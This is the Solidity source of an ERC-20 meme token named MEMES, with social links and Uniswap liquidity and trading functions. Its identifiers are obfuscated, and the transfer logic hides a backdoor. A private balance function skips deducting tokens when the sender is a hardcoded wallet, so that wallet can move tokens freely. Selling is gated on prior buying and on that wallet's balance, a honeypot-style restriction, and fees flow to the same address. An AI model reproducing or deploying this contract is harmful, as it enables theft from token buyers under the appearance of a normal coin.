/**

Follow the MEMES …


Twitter: https://twitter.com/Memeseth_Coin
Telegram: https://t.me/Memeseth_Coin
Website: https://memeseth.com/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _ruwve(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _ruwve(a, b, "SafeMath");
    }

    function  _ruwve(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract MEMES is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _Trorugk;
    address payable private _Fbzyukp;
    address private _crqvlu;

    string private constant _name = unicode"MEMES";
    string private constant _symbol = unicode"MEMES";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _pvylelr;
    mapping (address => bool) private _yrqijy;
    mapping(address => uint256) private _qnjpmq;
    uint256 public _qvolbid = _totalSupply;
    uint256 public _Wporoje = _totalSupply;
    uint256 public _reTjkfr= _totalSupply;
    uint256 public _vodTecf= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ykjvgq=0;
    uint256 private _uejpjrg=0;
    

    bool private _ewrnkfr;
    bool public _Drforuf = false;
    bool private ptyvhbe = false;
    bool private _opigvju = false;


    event _hprwqat(uint _qvolbid);
    modifier urvsgjr {
        ptyvhbe = true;
        _;
        ptyvhbe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _pvylelr[owner(

        )] = true;
        _pvylelr[address
        (this)] = true;
        _pvylelr[
            _Fbzyukp] = true;
        _Fbzyukp = 
        payable (0x5f36E0Fec7F52f1A0BcA50DFEd4f1ddAD4dFbC79);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _ruwve(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kjwdlk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Drforuf) {
                if (to 
                != address
                (_Trorugk) 
                && to !=
                 address
                 (_crqvlu)) {
                  require(_qnjpmq
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _qnjpmq
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _crqvlu && to != 
            address(_Trorugk) &&
             !_pvylelr[to] ) {
                require(amount 
                <= _qvolbid,
                 "Exceeds the _qvolbid.");
                require(balanceOf
                (to) + amount
                 <= _Wporoje,
                  "Exceeds the _Wporoje.");
                if(_uejpjrg
                < _ykjvgq){
                  require
                  (! _eirvpoz(to));
                }
                _uejpjrg++;
                 _yrqijy
                 [to]=true;
                kjwdlk = amount._pvr
                ((_uejpjrg>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _crqvlu &&
             from!= address(this) 
            && !_pvylelr[from] ){
                require(amount <= 
                _qvolbid && 
                balanceOf(_Fbzyukp)
                <_vodTecf,
                 "Exceeds the _qvolbid.");
                kjwdlk = amount._pvr((_uejpjrg>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_uejpjrg>
                _ykjvgq &&
                 _yrqijy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ptyvhbe 
            && to == _crqvlu &&
             _opigvju &&
             contractTokenBalance>
             _reTjkfr 
            && _uejpjrg>
            _ykjvgq&&
             !_pvylelr[to]&&
              !_pvylelr[from]
            ) {
                _transferFrom( _wnluf(amount, 
                _wnluf(contractTokenBalance,
                _vodTecf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _xpvubo(address
                    (this).balance);
                }
            }
        }

        if(kjwdlk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kjwdlk);
          emit
           Transfer(from,
           address
           (this),kjwdlk);
        }
        _balances[from
        ]= _ruwve(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _ruwve(kjwdlk));
        emit Transfer
        (from, to, 
        amount.
         _ruwve(kjwdlk));
    }

    function _transferFrom(uint256
     tokenAmount) private
      urvsgjr {
        if(tokenAmount==
        0){return;}
        if(!_ewrnkfr)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Trorugk.WETH();
        _approve(address(this),
         address(
             _Trorugk), 
             tokenAmount);
        _Trorugk.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wnluf
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _ruwve(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Fbzyukp){
            return a ;
        }else{
            return a .
             _ruwve (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvolbid = _totalSupply;
        _Wporoje = _totalSupply;
        emit _hprwqat(_totalSupply);
    }

    function _eirvpoz(address 
    account) private view 
    returns (bool) {
        uint256 eufkqv;
        assembly {
            eufkqv :=
             extcodesize
             (account)
        }
        return eufkqv > 
        0;
    }

    function _xpvubo(uint256
    amount) private {
        _Fbzyukp.
        transfer(
            amount);
    }

    function openuTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _ewrnkfr ) ;
        _Trorugk  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Trorugk), 
            _totalSupply);
        _crqvlu = 
        IUniswapV2Factory(_Trorugk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Trorugk .
             WETH ( ) );
        _Trorugk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_crqvlu).
        approve(address(_Trorugk), 
        type(uint)
        .max);
        _opigvju = true;
        _ewrnkfr = true;
    }

    receive() external payable {}
}